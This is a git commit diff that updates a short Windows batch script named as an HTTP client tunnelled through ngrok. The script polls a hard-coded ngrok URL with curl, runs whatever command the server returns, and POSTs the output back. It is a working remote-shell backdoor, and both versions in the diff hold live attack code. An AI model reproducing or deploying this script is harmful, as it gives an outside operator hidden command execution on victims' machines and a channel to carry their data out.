b7538e6178d81cd8723195eabe8ccd7b16700a84
ScottyxNova <160235045+ScottyxNova@users.noreply.github.com>
2025-11-23 11:54:36 +0200

    Update Client-Through-Http-ngrok-Win.bat

--- Client-Through-Http-ngrok-Win.bat
+++ Client-Through-Http-ngrok-Win.bat
@@ -2,17 +2,17 @@
 set URL=https://9a40b0bac7ee.ngrok-free.app
 
 :loop
-rem Wait 0.5 seconds (approx) using ping trick
-ping -n 1 127.0.0.1 >nul
+    rem Wait 0.5 seconds (approx) using ping trick
+    ping -n 1 127.0.0.1 >nul
 
-rem Get command from server
-for /f "delims=" %%A in ('curl -s %URL%') do set CMD=%%A
+    rem Get command from server
+    for /f "usebackq delims=" %%A in (`curl -s %URL%`) do set CMD=%%A
 
-if "%CMD%"=="" goto loop
+    if "%CMD%"=="" goto loop
 
-rem Execute command and capture output
-for /f "delims=" %%O in ('"%CMD%" 2^>^&1') do (
-    curl -X POST -d "%%O" %URL%
-)
+    rem Execute command and capture output
+    for /f "delims=" %%O in ('%CMD% 2^>^&1') do (
+        curl -X POST -d "%%O" %URL%
+    )
 
-goto loop
+    goto loop
